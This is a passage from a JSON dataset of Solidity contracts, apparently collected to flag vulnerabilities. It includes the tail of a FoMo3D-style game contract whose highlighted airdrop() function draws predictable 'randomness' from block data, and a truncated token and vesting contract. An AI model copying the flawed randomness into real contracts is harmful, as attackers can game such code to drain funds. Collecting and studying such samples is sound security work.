_eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;\n emit PCKevents.onReLoadAndDistribute\n (\n msg.sender,\n plyr_[_pID].name,\n _eventData_.compressedData,\n _eventData_.compressedIDs,\n _eventData_.winnerAddr,\n _eventData_.winnerName,\n _eventData_.amountWon,\n _eventData_.newPot,\n _eventData_.PCPAmount,\n _eventData_.genAmount\n );\n }\n }\n function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, PCKdatasets.EventReturns memory _eventData_)\n private\n {\n if (plyrRnds_[_pID][_rID].keys == 0)\n _eventData_ = managePlayer(_pID, _eventData_);\n if (round_[_rID].eth < 100000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 1000000000000000000)\n {\n uint256 _availableLimit = (1000000000000000000).sub(plyrRnds_[_pID][_rID].eth);\n uint256 _refund = _eth.sub(_availableLimit);\n plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);\n _eth = _availableLimit;\n }\n if (_eth > 1000000000)\n {\n uint256 _keys = (round_[_rID].eth).keysRec(_eth);\n if (_keys >= 1000000000000000000)\n {\n updateTimer(_keys, _rID, _eth);\n if (round_[_rID].plyr != _pID)\n round_[_rID].plyr = _pID;\n if (round_[_rID].team != _team)\n round_[_rID].team = _team;\n _eventData_.compressedData = _eventData_.compressedData + 100;\n }\n if (_eth >= 100000000000000000) {\n airDropTracker_++;\n if (airdrop() == true) {\n uint256 _prize;\n if (_eth >= 10000000000000000000)\n {\n _prize = ((airDropPot_).mul(75)) / 100;\n plyr_[_pID].win = (plyr_[_pID].win).add(_prize);\n airDropPot_ = (airDropPot_).sub(_prize);\n _eventData_.compressedData += 300000000000000000000000000000000;\n } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {\n _prize = ((airDropPot_).mul(50)) / 100;\n plyr_[_pID].win = (plyr_[_pID].win).add(_prize);\n airDropPot_ = (airDropPot_).sub(_prize);\n _eventData_.compressedData += 200000000000000000000000000000000;\n } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {\n _prize = ((airDropPot_).mul(25)) / 100;\n plyr_[_pID].win = (plyr_[_pID].win).add(_prize);\n airDropPot_ = (airDropPot_).sub(_prize);\n _eventData_.compressedData += 300000000000000000000000000000000;\n }\n _eventData_.compressedData += 10000000000000000000000000000000;\n _eventData_.compressedData += _prize * 1000000000000000000000000000000000;\n airDropTracker_ = 0;\n }\n }\n _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);\n plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);\n plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);\n round_[_rID].keys = _keys.add(round_[_rID].keys);\n round_[_rID].eth = _eth.add(round_[_rID].eth);\n rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);\n _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);\n _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);\n endTx(_pID, _team, _eth, _keys, _eventData_);\n }\n }\n function calcUnMaskedEarnings(uint256 _pID, uint256 _rIDlast)\n private\n view\n returns(uint256)\n {\n return( (((round_[_rIDlast].mask).mul(plyrRnds_[_pID][_rIDlast].keys)) / (1000000000000000000)).sub(plyrRnds_[_pID][_rIDlast].mask) );\n }\n function calcKeysReceived(uint256 _rID, uint256 _eth)\n public\n view\n returns(uint256)\n {\n uint256 _now = now;\n if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n return ( (round_[_rID].eth).keysRec(_eth) );\n else\n return ( (_eth).keys() );\n }\n function iWantXKeys(uint256 _keys)\n public\n view\n returns(uint256)\n {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n return ( (round_[_rID].keys.add(_keys)).ethRec(_keys) );\n else\n return ( (_keys).eth() );\n }\n function receivePlayerInfo(uint256 _pID, address _addr, bytes32 _name, uint256 _laff)\n external\n {\n require (msg.sender == address(PlayerBook), \"your not playerNames contract... hmmm..\");\n if (pIDxAddr_[_addr] != _pID)\n pIDxAddr_[_addr] = _pID;\n if (pIDxName_[_name] != _pID)\n pIDxName_[_name] = _pID;\n if (plyr_[_pID].addr != _addr)\n plyr_[_pID].addr = _addr;\n if (plyr_[_pID].name != _name)\n plyr_[_pID].name = _name;\n if (plyr_[_pID].laff != _laff)\n plyr_[_pID].laff = _laff;\n if (plyrNames_[_pID][_name] == false)\n plyrNames_[_pID][_name] = true;\n }\n function receivePlayerNameList(uint256 _pID, bytes32 _name)\n external\n {\n require (msg.sender == address(PlayerBook), \"your not playerNames contract... hmmm..\");\n if(plyrNames_[_pID][_name] == false)\n plyrNames_[_pID][_name] = true;\n }\n function determinePID(PCKdatasets.EventReturns memory _eventData_)\n private\n returns (PCKdatasets.EventReturns)\n {\n uint256 _pID = pIDxAddr_[msg.sender];\n if (_pID == 0)\n {\n _pID = PlayerBook.getPlayerID(msg.sender);\n bytes32 _name = PlayerBook.getPlayerName(_pID);\n uint256 _laff = PlayerBook.getPlayerLAff(_pID);\n pIDxAddr_[msg.sender] = _pID;\n plyr_[_pID].addr = msg.sender;\n if (_name != \"\")\n {\n pIDxName_[_name] = _pID;\n plyr_[_pID].name = _name;\n plyrNames_[_pID][_name] = true;\n }\n if (_laff != 0 && _laff != _pID)\n plyr_[_pID].laff = _laff;\n _eventData_.compressedData = _eventData_.compressedData + 1;\n }\n return (_eventData_);\n }\n function verifyTeam(uint256 _team)\n private\n pure\n returns (uint256)\n {\n if (_team < 0 || _team > 3)\n return(2);\n else\n return(_team);\n }\n function managePlayer(uint256 _pID, PCKdatasets.EventReturns memory _eventData_)\n private\n returns (PCKdatasets.EventReturns)\n {\n if (plyr_[_pID].lrnd != 0)\n updateGenVault(_pID, plyr_[_pID].lrnd);\n plyr_[_pID].lrnd = rID_;\n _eventData_.compressedData = _eventData_.compressedData + 10;\n return(_eventData_);\n }\n function nextRound() private {\n rID_++;\n round_[rID_].strt = now;\n round_[rID_].end = now.add(rndInit_).add(rndGap_);\n }\n function endRound(PCKdatasets.EventReturns memory _eventData_)\n private\n returns (PCKdatasets.EventReturns)\n {\n uint256 _rID = rID_;\n uint256 _winPID = round_[_rID].plyr;\n uint256 _winTID = round_[_rID].team;\n uint256 _pot = round_[_rID].pot;\n uint256 _win = (_pot.mul(48)) / 100;\n uint256 _com = (_pot / 50);\n uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;\n uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;\n uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);\n uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);\n uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);\n if (_dust > 0)\n {\n _gen = _gen.sub(_dust);\n _res = _res.add(_dust);\n }\n plyr_[_winPID].win = _win.add(plyr_[_winPID].win);\n if (!address(Pro_Inc).call.value(_com)(bytes4(keccak256(\"deposit()\"))))\n {\n _p3d = _p3d.add(_com);\n _com = 0;\n }\n round_[_rID].mask = _ppt.add(round_[_rID].mask);\n if (_p3d > 0)\n PCGod.deposit.value(_p3d)();\n _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);\n _eventData_.winnerAddr = plyr_[_winPID].addr;\n _eventData_.winnerName = plyr_[_winPID].name;\n _eventData_.amountWon = _win;\n _eventData_.genAmount = _gen;\n _eventData_.PCPAmount = _p3d;\n _eventData_.newPot = _res;\n _rID++;\n round_[_rID].ended = false;\n round_[_rID].strt = now;\n round_[_rID].end = now.add(rndInit_).add(rndGap_);\n round_[_rID].pot = _res;\n return(_eventData_);\n }\n function updateGenVault(uint256 _pID, uint256 _rIDlast)\n private\n {\n uint256 _earnings = calcUnMaskedEarnings(_pID, _rIDlast);\n if (_earnings > 0)\n {\n plyr_[_pID].gen = _earnings.add(plyr_[_pID].gen);\n plyrRnds_[_pID][_rIDlast].mask = _earnings.add(plyrRnds_[_pID][_rIDlast].mask);\n }\n }\n function updateTimer(uint256 _keys, uint256 _rID, uint256 _eth)\n private\n {\n uint256 _now = now;\n uint256 _newTime;\n if (_now > round_[_rID].end && round_[_rID].plyr == 0)\n _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(_now);\n else\n _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(round_[_rID].end);\n uint256 _newEndTime;\n if (_newTime < (rndMax_).add(_now))\n _newEndTime = _newTime;\n else\n _newEndTime = rndMax_.add(_now);\n if ( _eth >= rndReduceThreshold_ ) {\n _newEndTime = (_newEndTime).sub( (((_keys) / (1000000000000000000))).mul(rndInc_).add( (((_keys) / (2000000000000000000) ).mul(rndInc_)) ) );\n if( _newEndTime < _now + rndMin_ )\n _newEndTime = _now + rndMin_ ;\n }\n round_[_rID].end = _newEndTime;\n }\n function airdrop() private view returns(bool) {\n uint256 seed = uint256(keccak256(abi.encodePacked(\n (block.timestamp).add\n (block.difficulty).add\n ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add\n (block.gaslimit).add\n ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add\n (block.number)\n )));\n if((seed - ((seed / 1000) * 1000)) < airDropTracker_)\n return(true);\n else\n return(false);\n }\n function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, PCKdatasets.EventReturns memory _eventData_)\n private\n returns(PCKdatasets.EventReturns)\n {\n uint256 _com = _eth / 50;\n uint256 _p3d;\n if (!address(Pro_Inc).call.value(_com)(bytes4(keccak256(\"deposit()\"))))\n {\n _p3d = _com;\n _com = 0;\n }\n uint256 _long = _eth / 100;\n otherPCK_.potSwap.value(_long)();\n uint256 _aff = _eth / 10;\n if (_affID != _pID && plyr_[_affID].name != '') {\n plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);\n emit PCKevents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);\n } else {\n _p3d = _aff;\n }\n _p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));\n if (_p3d > 0)\n {\n PCGod.deposit.value(_p3d)();\n _eventData_.PCPAmount = _p3d.add(_eventData_.PCPAmount);\n }\n return(_eventData_);\n }\n function potSwap()\n external\n payable\n {\n uint256 _rID = rID_ + 1;\n round_[_rID].pot = round_[_rID].pot.add(msg.value);\n emit PCKevents.onPotSwapDeposit(_rID, msg.value);\n }\n function distributeInternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _team, uint256 _keys, PCKdatasets.EventReturns memory _eventData_)\n private\n returns(PCKdatasets.EventReturns)\n {\n uint256 _gen = (_eth.mul(fees_[_team].gen)) / 100;\n uint256 _air = (_eth / 100);\n airDropPot_ = airDropPot_.add(_air);\n _eth = _eth.sub(((_eth.mul(14)) / 100).add((_eth.mul(fees_[_team].p3d)) / 100));\n uint256 _pot = _eth.sub(_gen);\n uint256 _dust = updateMasks(_rID, _pID, _gen, _keys);\n if (_dust > 0)\n _gen = _gen.sub(_dust);\n round_[_rID].pot = _pot.add(_dust).add(round_[_rID].pot);\n _eventData_.genAmount = _gen.add(_eventData_.genAmount);\n _eventData_.potAmount = _pot;\n return(_eventData_);\n }\n function updateMasks(uint256 _rID, uint256 _pID, uint256 _gen, uint256 _keys)\n private\n returns(uint256)\n {\n uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);\n round_[_rID].mask = _ppt.add(round_[_rID].mask);\n uint256 _pearn = (_ppt.mul(_keys)) / (1000000000000000000);\n plyrRnds_[_pID][_rID].mask = (((round_[_rID].mask.mul(_keys)) / (1000000000000000000)).sub(_pearn)).add(plyrRnds_[_pID][_rID].mask);\n return(_gen.sub((_ppt.mul(round_[_rID].keys)) / (1000000000000000000)));\n }\n function withdrawEarnings(uint256 _pID)\n private\n returns(uint256)\n {\n updateGenVault(_pID, plyr_[_pID].lrnd);\n uint256 _earnings = (plyr_[_pID].win).add(plyr_[_pID].gen).add(plyr_[_pID].aff);\n if (_earnings > 0)\n {\n plyr_[_pID].win = 0;\n plyr_[_pID].gen = 0;\n plyr_[_pID].aff = 0;\n }\n return(_earnings);\n }\n function endTx(uint256 _pID, uint256 _team, uint256 _eth, uint256 _keys, PCKdatasets.EventReturns memory _eventData_)\n private\n {\n _eventData_.compressedData = _eventData_.compressedData + (now * 1000000000000000000) + (_team * 100000000000000000000000000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + _pID + (rID_ * 10000000000000000000000000000000000000000000000000000);\n emit PCKevents.onEndTx\n (\n _eventData_.compressedData,\n _eventData_.compressedIDs,\n plyr_[_pID].name,\n msg.sender,\n _eth,\n _keys,\n _eventData_.winnerAddr,\n _eventData_.winnerName,\n _eventData_.amountWon,\n _eventData_.newPot,\n _eventData_.PCPAmount,\n _eventData_.genAmount,\n _eventData_.potAmount,\n airDropPot_\n );\n }\n bool public activated_ = false;\n function activate() public {\n require(\n msg.sender == admin,\n \"only team just can activate\"\n );\n require(address(otherPCK_) != address(0), \"must link to other PCK first\");\n require(activated_ == false, \"PCK already activated\");\n activated_ = true;\n rID_ = 1;\n round_[1].strt = now + rndExtra_ - rndGap_;\n round_[1].end = now + rndInit_ + rndExtra_;\n }\n function setOtherPCK(address _otherPCK) public {\n require(\n msg.sender == admin,\n \"only team just can activate\"\n );\n require(address(otherPCK_) == address(0), \"silly dev, you already did that\");\n otherPCK_ = otherPCK(_otherPCK);\n }\n}\nlibrary PCKdatasets {\n struct EventReturns {\n uint256 compressedData;\n uint256 compressedIDs;\n address winnerAddr;\n bytes32 winnerName;\n uint256 amountWon;\n uint256 newPot;\n uint256 PCPAmount;\n uint256 genAmount;\n uint256 potAmount;\n }\n struct Player {\n address addr;\n bytes32 name;\n uint256 win;\n uint256 gen;\n uint256 aff;\n uint256 lrnd;\n uint256 laff;\n }\n struct PlayerRounds {\n uint256 eth;\n uint256 keys;\n uint256 mask;\n uint256 ico;\n }\n struct Round {\n uint256 plyr;\n uint256 team;\n uint256 end;\n bool ended;\n uint256 strt;\n uint256 keys;\n uint256 eth;\n uint256 pot;\n uint256 mask;\n uint256 ico;\n uint256 icoGen;\n uint256 icoAvg;\n }\n struct TeamFee {\n uint256 gen;\n uint256 p3d;\n }\n struct PotSplit {\n uint256 gen;\n uint256 p3d;\n }\n}\nlibrary PCKKeysCalcLong {\n using SafeMath for *;\n function keysRec(uint256 _curEth, uint256 _newEth)\n internal\n pure\n returns (uint256)\n {\n return(keys((_curEth).add(_newEth)).sub(keys(_curEth)));\n }\n function ethRec(uint256 _curKeys, uint256 _sellKeys)\n internal\n pure\n returns (uint256)\n {\n return((eth(_curKeys)).sub(eth(_curKeys.sub(_sellKeys))));\n }\n function keys(uint256 _eth)\n internal\n pure\n returns(uint256)\n {\n return ((((((_eth).mul(1000000000000000000)).mul(312500000000000000000000000)).add(5624988281256103515625000000000000000000000000000000000000000000)).sqrt()).sub(74999921875000000000000000000000)) / (156250000);\n }\n function eth(uint256 _keys)\n internal\n pure\n returns(uint256)\n {\n return ((78125000).mul(_keys.sq()).add(((149999843750000).mul(_keys.mul(1000000000000000000))) / (2))) / ((1000000000000000000).sq());\n }\n}\ninterface otherPCK {\n function potSwap() external payable;\n}\ninterface PCKExtSettingInterface {\n function getFastGap() external view returns(uint256);\n function getLongGap() external view returns(uint256);\n function getFastExtra() external view returns(uint256);\n function getLongExtra() external view returns(uint256);\n}\ninterface PlayCoinGodInterface {\n function deposit() external payable;\n}\ninterface ProForwarderInterface {\n function deposit() external payable returns(bool);\n function status() external view returns(address, address, bool);\n function startMigration(address _newCorpBank) external returns(bool);\n function cancelMigration() external returns(bool);\n function finishMigration() external returns(bool);\n function setup(address _firstCorpBank) external;\n}\ninterface PlayerBookInterface {\n function getPlayerID(address _addr) external returns (uint256);\n function getPlayerName(uint256 _pID) external view returns (bytes32);\n function getPlayerLAff(uint256 _pID) external view returns (uint256);\n function getPlayerAddr(uint256 _pID) external view returns (address);\n function getNameFee() external view returns (uint256);\n function registerNameXIDFromDapp(address _addr, bytes32 _name, uint256 _affCode, bool _all) external payable returns(bool, uint256);\n function registerNameXaddrFromDapp(address _addr, bytes32 _name, address _affCode, bool _all) external payable returns(bool, uint256);\n function registerNameXnameFromDapp(address _addr, bytes32 _name, bytes32 _affCode, bool _all) external payable returns(bool, uint256);\n}\nlibrary NameFilter {\n function nameFilter(string _input)\n internal\n pure\n returns(bytes32)\n {\n bytes memory _temp = bytes(_input);\n uint256 _length = _temp.length;\n require (_length <= 32 && _length > 0, \"string must be between 1 and 32 characters\");\n require(_temp[0] != 0x20 && _temp[_length-1] != 0x20, \"string cannot start or end with space\");\n if (_temp[0] == 0x30)\n {\n require(_temp[1] != 0x78, \"string cannot start with 0x\");\n require(_temp[1] != 0x58, \"string cannot start with 0X\");\n }\n bool _hasNonNumber;\n for (uint256 i = 0; i < _length; i++)\n {\n if (_temp[i] > 0x40 && _temp[i] < 0x5b)\n {\n _temp[i] = byte(uint(_temp[i]) + 32);\n if (_hasNonNumber == false)\n _hasNonNumber = true;\n } else {\n require\n (\n _temp[i] == 0x20 ||\n (_temp[i] > 0x60 && _temp[i] < 0x7b) ||\n (_temp[i] > 0x2f && _temp[i] < 0x3a),\n \"string contains invalid characters\"\n );\n if (_temp[i] == 0x20)\n require( _temp[i+1] != 0x20, \"string cannot contain consecutive spaces\");\n if (_hasNonNumber == false && (_temp[i] < 0x30 || _temp[i] > 0x39))\n _hasNonNumber = true;\n }\n }\n require(_hasNonNumber == true, \"string cannot be only numbers\");\n bytes32 _ret;\n assembly {\n _ret := mload(add(_temp, 32))\n }\n return (_ret);\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b)\n internal\n pure\n returns (uint256 c)\n {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n require(c / a == b, \"SafeMath mul failed\");\n return c;\n }\n function sub(uint256 a, uint256 b)\n internal\n pure\n returns (uint256)\n {\n require(b <= a, \"SafeMath sub failed\");\n return a - b;\n }\n function add(uint256 a, uint256 b)\n internal\n pure\n returns (uint256 c)\n {\n c = a + b;\n require(c >= a, \"SafeMath add failed\");\n return c;\n }\n function sqrt(uint256 x)\n internal\n pure\n returns (uint256 y)\n {\n uint256 z = ((add(x,1)) / 2);\n y = x;\n while (z < y)\n {\n y = z;\n z = ((add((x / z),z)) / 2);\n }\n }\n function sq(uint256 x)\n internal\n pure\n returns (uint256)\n {\n return (mul(x,x));\n }\n function pwr(uint256 x, uint256 y)\n internal\n pure\n returns (uint256)\n {\n if (x==0)\n return (0);\n else if (y==0)\n return (1);\n else\n {\n uint256 z = x;\n for (uint256 i=1; i < y; i++)\n z = mul(z,x);\n return (z);\n }\n }\n}",
  "extract_feature": [
    "function airdrop() private view returns(bool) {\nuint256 seed = uint256(keccak256(abi.encodePacked(\n(block.timestamp).add\n(block.difficulty).add\n((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add\n(block.gaslimit).add\n((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add\n(block.number)\n)));\nif((seed - ((seed / 1000) * 1000)) < airDropTracker_)\nreturn(true);\nelse\nreturn(false);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6b750a970a4fdc0b77"
  },
  "filename": "3290.sol",
  "content": "pragma solidity 0.4.18;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\nlibrary Math {\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n Unpause();\n }\n}\ncontract Presale {\n using SafeMath for uint256;\n uint256 private weiRaised;\n uint256 private startTime;\n uint256 private endTime;\n uint256 private rate;\n uint256 private cap;\n function Presale(uint256 _startTime, uint256 duration, uint256 _rate, uint256 _cap) public {\n require(_rate > 0);\n require(_cap > 0);\n require(_startTime >= now);\n require(duration > 0);\n rate = _rate;\n cap = _cap;\n startTime = _startTime;\n endTime = startTime + duration * 1 days;\n weiRaised = 0;\n }\n function totalWei() public constant returns(uint256) {\n return weiRaised;\n }\n function capRemaining() public constant returns(uint256) {\n return cap.sub(weiRaised);\n }\n function totalCap() public constant returns(uint256) {\n return cap;\n }\n function buyTokens(address purchaser, uint256 value) internal returns(uint256) {\n require(validPurchase(value));\n uint256 tokens = rate.mul(value);\n weiRaised = weiRaised.add(value);\n return tokens;\n }\n function hasEnded() internal constant returns(bool) {\n return now > endTime || weiRaised >= cap;\n }\n function hasStarted() internal constant returns(bool) {\n return now > startTime;\n }\n function validPurchase(uint256 value) internal view returns (bool) {\n bool withinCap = weiRaised.add(value) <= cap;\n return withinCap && withinPeriod();\n }\n function presaleRate() public view returns(uint256) {\n return rate;\n }\n function withinPeriod () private constant returns(bool) {\n return now >= startTime && now <= endTime;\n }\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n assert(token.transfer(to, value));\n }\n function safeTransferFrom(ERC20 token, address from, address to, uint256 value) internal {\n assert(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n assert(token.approve(spender, value));\n }\n}\ncontract CanReclaimToken is Ownable {\n using SafeERC20 for ERC20Basic;\n function reclaimToken(ERC20Basic token) external onlyOwner {\n uint256 balance = token.balanceOf(this);\n token.safeTransfer(owner, balance);\n }\n}\ncontract VestingTrustee is Ownable, CanReclaimToken {\n using SafeMath for uint256;\n ERC20 public token;\n struct Grant {\n uint256 value;\n uint256 start;\n uint256 cliff;\n uint256 end;\n uint256 installmentLength;\n uint256 transferred;\n bool revokable;\n uint256 prevested;\n uint256 vestingPercentage;\n }\n mapping (address => Grant) public grants;\n uint256 public totalVesting;\n event NewGrant(address indexed _from, address indexed _to, uint256 _value);\n event TokensUnlocked(address indexed _to, uint256 _value);\n event GrantRevoked(address indexed _holder, uint256 _refund);\n function VestingTrustee(address _token) {\n require(_token != address(0));\n token = ERC20(_token);\n }\n function grant(address _to, uint256 _value, uint256 _start, uint256 _cliff, uint256 _end,\n uint256 _installmentLength, uint256 vestingPercentage, uint256 prevested, bool _revokable)\n external onlyOwner {\n require(_to != address(0));\n require(_to != address(this));\n require(_value > 0);\n require(_value.sub(prevested) > 0);\n require(vestingPercentage > 0);\n require(grants[_to].value == 0);\n require(_start <= _cliff && _cliff <= _end);\n require(_installmentLength > 0 && _installmentLength <= _end.sub(_start));\n require(totalVesting.add(_value.sub(prevested)) <= token.balanceOf(address(this)));\n grants[_to] = Grant({\n value: _value,\n start: _start,\n cliff: _cliff,\n end: _end,\n installmentLength: _installmentLength,\n transferred: prevested,\n revokable: _revokable,\n prevested: prevested,\n vestingPercentage: vestingPercentage\n });\n totalVesting = totalVesting.add(_value.sub(prevested));\n NewGrant(msg.sender, _to, _value);\n }\n function revoke(address _holder) public onlyOwner {\n Grant memory grant = grants[_holder];\n require(grant.revokable);\n uint256 refund = grant.value.sub(grant.transferred);\n delete grants[_holder];\n totalVesting = totalVesting.sub(refund);\n token.transfer(msg.sender, refund);\n GrantRevoked(_holder, refund);\n }\n function vestedTokens(address _holder, uint256 _time) external constant returns (uint256) {\n Grant memory grant = grants[_holder];\n if (grant.value == 0) {\n return 0;\n }\n return calculateVestedTokens(grant, _time);\n }\n function calculateVestedTokens(Grant _grant, uint256 _time) private constant returns (uint256) {\n if (_time < _grant.cliff) {\n return _grant.prevested;\n }\n if (_time >= _grant.end) {\n return _grant.value;\n }\n uint256 installmentsPast = _time.sub(_grant.cliff).div(_grant.installmentLength) + 1;\n return _grant.prevested.add(_grant.value.mul(installmentsPast.mul(_grant.vestingPercentage)).div(100));\n }\n function unlockVestedTokens() external {\n Grant storage grant = grants[msg.sender];\n require(grant.value != 0);\n uint256 vested = calculateVestedTokens(grant, now);\n if (vested == 0) {\n revert();\n }\n uint256 transferable = vested.sub(grant.transferred);\n if (transferable == 0) {\n revert();\n }\n grant.transferred = grant.transferred.add(transferable);\n totalVesting = totalVesting.sub(transferable);\n token.transfer(msg.sender, transferable);\n TokensUnlocked(msg.sender, transferable);\n }\n function reclaimEther() external onlyOwner {\n assert(owner.send(this.balance));\n }\n}\ncontract Controlled {\n modifier onlyController { require(msg.sender == controller); _; }\n address public controller;\n function Controlled() public { controller = msg.sender;}\n function changeController(address _newController) public onlyController {\n controller = _newController;\n }\n}\ncontract TokenController {\n function proxyPayment(address _owner) public payable returns(bool);\n function onTransfer(address _from, address _to, uint _amount) public returns(bool);\n function onApprove(address _owner, address _spender, uint _amount) public\n returns(bool);\n}\ncontract ApproveAndCallFallBack {\n function receiveApproval(address from, uint256 _amount, address _token, bytes _data) public;\n}\ncontract MiniMeToken is Controlled {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'MMT_0.2';\n struct Checkpoint {\n uint128 fromBlock;\n uint128 value;\n }\n MiniMeToken public parentToken;\n uint public parentSnapShotBlock;\n uint public creationBlock;\n mapping (address => Checkpoint[]) balances;\n mapping (address => mapping (address => uint256)) allowed;\n Checkpoint[] totalSupplyHistory;\n bool public transfersEnabled;\n MiniMeTokenFactory public tokenFactory;\n function MiniMeToken(\n address _tokenFactory,\n address _parentToken,\n uint _parentSnapShotBlock,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol,\n bool _transfersEnabled\n ) public {\n tokenFactory = MiniMeTokenFactory(_tokenFactory);\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n parentToken = MiniMeToken(_parentToken);\n parentSnapShotBlock = _parentSnapShotBlock;\n transfersEnabled = _transfersEnabled;\n creationBlock = block.number;\n }\n function transfer(address _to, uint256 _amount) public returns (bool success) {\n require(transfersEnabled);\n doTransfer(msg.sender, _to, _amount);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _amount\n ) public returns (bool success) {\n if (msg.sender != controller) {\n require(transfersEnabled);\n require(allowed[_from][msg.sender] >= _amount);\n allowed[_from][msg.sender] -= _amount;\n }\n doTransfer(_from, _to, _amount);\n return true;\n }\n function doTransfer(address _from, address _to, uint _amount\n ) internal {\n if (_amount == 0) {\n Transfer(_from, _to, _amount);\n return;\n }\n require(parentSnapShotBlock < block.number);\n require((_to != 0) && (_to != address(this)));\n var previousBalanceFrom = balanceOfAt(_from, block.number);\n require(previousBalanceFrom >= _amount);\n if (isContract(controller)) {\n require(TokenController(controller).onTransfer(_from, _to, _amount));\n }\n updateValueAtNow(balances[_from], previousBalanceFrom - _amount);\n var previousBalanceTo = balanceOfAt(_to, block.number);\n require(previousBalanceTo + _amount >= previousBalanceTo);\n updateValueAtNow(balances[_to], previousBalanceTo + _amount);\n Transfer(_from, _to, _amount);\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balanceOfAt(_owner, block.number);\n }\n function approve(address _spender, uint256 _amount) public returns (bool success) {\n require(transfersEnabled);\n require((_amount == 0) || (allowed[msg.sender][_spender] == 0));\n if (isContract(controller)) {\n require(TokenController(controller).onApprove(msg.sender, _spender, _amount));\n }\n allowed[msg.sender][_spender] = _amount;\n Approval(msg.sender, _spender, _amount);\n return true;\n }\n function allowance(address _owner, address _spender\n ) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function approveAndCall(address _spender, uint256 _amount, bytes _extraData\n ) public returns (bool success) {\n require(approve(_spender, _amount));\n ApproveAndCallFallBack(_spender).receiveApproval(\n msg.sender,\n _amount,\n this,\n _extraData\n );\n return true;\n }\n function totalSupply() public constant returns (uint) {\n return totalSupplyAt(block.number);\n }\n function balanceOfAt(address _owner, uint 